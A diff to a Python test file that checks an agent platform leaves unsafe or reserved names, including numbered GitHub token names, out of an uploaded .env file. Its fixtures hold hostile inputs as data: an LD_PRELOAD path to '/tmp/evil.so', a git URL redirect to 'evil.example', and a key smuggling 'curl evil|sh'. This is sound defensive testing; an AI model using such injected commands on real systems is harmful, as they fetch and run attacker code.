@@ -16,11 +16,13 @@ from daimon.core.credential_env import (
     upload_env_and_mount,
     upload_git_identity_and_mount,
 )
+from daimon.core.errors import StoreError
 from daimon.core.github_app_auth import BotIdentity
 from daimon.core.stores.agent_files import put_agent_file
 from daimon.core.stores.domain import AgentFileRow
 from daimon.core.stores.pending_file_deletes import list_due_pending_file_deletes
 from daimon.testing.factories import make_tenant
+from sqlalchemy import text
 from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker
 
 _NOW = dt.datetime(2026, 5, 29, 12, 0, 0, tzinfo=dt.UTC)
@@ -82,6 +84,8 @@ def test_assemble_env_bytes_leaves_out_rows_stored_under_an_unsafe_name() -> Non
         _row("OK", "1"),
         _row("LD_PRELOAD", "/tmp/evil.so"),
         _row("GIT_CONFIG_KEY_0", "url.https://evil.example/.insteadOf"),
+        _row("GH_TOKEN_2", "uploaded-token"),
+        _row("GITHUB_TOKEN_3", "uploaded-alias"),
         _row("X;curl evil|sh;Y", "1"),
         _row("NUL_VALUE", "a\0b"),
         _row("AFTER", "2"),
@@ -95,6 +99,8 @@ def test_assemble_env_bytes_leaves_out_rows_stored_under_an_unsafe_name() -> Non
     assert [log["key"] for log in skipped] == [
         "LD_PRELOAD",
         "GIT_CONFIG_KEY_0",
+        "GH_TOKEN_2",
+        "GITHUB_TOKEN_3",
         "X;curl evil|sh;Y",
         "NUL_VALUE",
     ]
@@ -186,6 +192,53 @@ async def test_upload_env_and_mount_uploads_env_and_returns_mount_dict(
     assert b"A=1\nB=2\n" in capture.uploaded_bodies[0], (
         "uploaded multipart body should contain the assembled .env bytes"
     )
+
+
+@pytest.mark.asyncio
+async def test_numbered_github_token_is_omitted_from_mounted_env(
+    db_session: AsyncSession,
+    db_session_factory: async_sessionmaker[AsyncSession],
+) -> None:
+    tenant = await make_tenant(db_session)
+    agent_id = uuid.uuid4()
+    with pytest.raises(StoreError, match="GH_TOKEN_2 is a reserved name"):
+        await put_agent_file(
+            db_session,
+            tenant_id=tenant.id,
+            agent_id=agent_id,
+            key="GH_TOKEN_2",
+            content="uploaded-token",
+            set_by_account_id=None,
+        )
+    # Simulate a row saved before numbered App token names were reserved.
+    await db_session.execute(
+        text(
+            "INSERT INTO agent_files (tenant_id, agent_id, key, content) "
+            "VALUES (:tenant, :agent, 'GH_TOKEN_2', 'uploaded-token')"
+        ),
+        {"tenant": tenant.id, "agent": agent_id},
+    )
+    await put_agent_file(
+        db_session,
+        tenant_id=tenant.id,
+        agent_id=agent_id,
+        key="SAFE_TOKEN",
+        content="safe-value",
+        set_by_account_id=None,
+    )
+    await db_session.commit()
+    capture = _UploadCapture(file_id="file_numbered")
+    result = await upload_env_and_mount(
+        _client_for(capture),
+        db_session_factory,
+        tenant_id=tenant.id,
+        agent_id=agent_id,
+        exclude_github=True,
+    )
+    assert result is not None
+    assert b"SAFE_TOKEN=safe-value" in capture.uploaded_bodies[0]
+    assert b"GH_TOKEN_2" not in capture.uploaded_bodies[0]
+    assert b"uploaded-token" not in capture.uploaded_bodies[0]
 
 
 @pytest.mark.asyncio
